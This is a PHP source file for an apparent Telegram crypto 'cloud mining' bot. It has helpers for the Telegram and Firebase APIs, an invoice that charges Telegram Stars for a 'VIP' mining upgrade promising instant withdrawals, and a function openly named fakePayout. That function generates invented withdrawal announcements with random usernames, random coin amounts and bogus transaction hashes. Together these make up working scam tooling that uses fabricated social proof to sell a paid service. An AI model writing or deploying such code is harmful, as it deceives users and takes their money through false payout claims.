<?php
include 'config.php';

function bot($method, $datas = []) {
    global $botToken;
    $url = "https://api.telegram.org/bot" . $botToken . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($datas));
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

function firebase($path, $method = "GET", $data = null) {
    global $firebaseURL, $firebaseSecret;
    $url = $firebaseURL . "/" . $path . ".json?auth=" . $firebaseSecret;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    
    if ($data !== null) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    }
    
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

function generateSmartName() {
    $prefixes = ['Crypto', 'Ton', 'Miner', 'Rich', 'Alpha', 'Pro', 'Sky', 'Global', 'Fast', 'Elite', 'Mega', 'Bit', 'Ltc', 'Doge', 'Web3'];
    $suffixes = ['Node', 'Master', 'Owner', 'User', 'Hero', 'Hunter', 'Shark', 'Winner', 'Expert', 'Boss', 'Holder'];
    $name = $prefixes[array_rand($prefixes)] . $suffixes[array_rand($suffixes)];
    $styles = [$name . rand(10, 99), $name . "_" . rand(100, 999), strtolower($name) . rand(2024, 2026), ucfirst($name)];
    return $styles[array_rand($styles)];
}

function sendStarsInvoice($chat_id, $lang = 'en') {
    bot('sendInvoice', [
        'chat_id' => $chat_id,
        'title' => "💎 Upgrade VIP Hardware Array",
        'description' => "Unlock unlimited priority cloud mining nodes! Multiplies speed globally for all 6 coins and shortens standard withdrawal times to instant 5-minute settlement.",
        'payload' => "upgrade_vip_tokens",
        'provider_token' => "", 
        'currency' => "XTR",     
        'prices' => json_encode([['label' => "VIP Cluster Node License", 'amount' => 250]])
    ]);
}

function fakePayout($lang = 'en') {
    $coins = ['TON', 'STARS', 'NOT', 'LTC', 'BNB', 'DOGE'];
    $selected = $coins[array_rand($coins)];
    $amount = number_format(lcg_value() * (25 - 5) + 5, 2);
    if($selected === 'NOT' || $selected === 'STARS') {
        $amount = number_format(rand(1200, 18500));
    }
    $tx = substr(md5(rand()), 0, 12);
    return "⚡️ `LIVE PROTOCOL:` User **" . generateSmartName() . "** just withdrawn **$amount $selected** via priority instant node. [Tx: $tx]";
}
?>
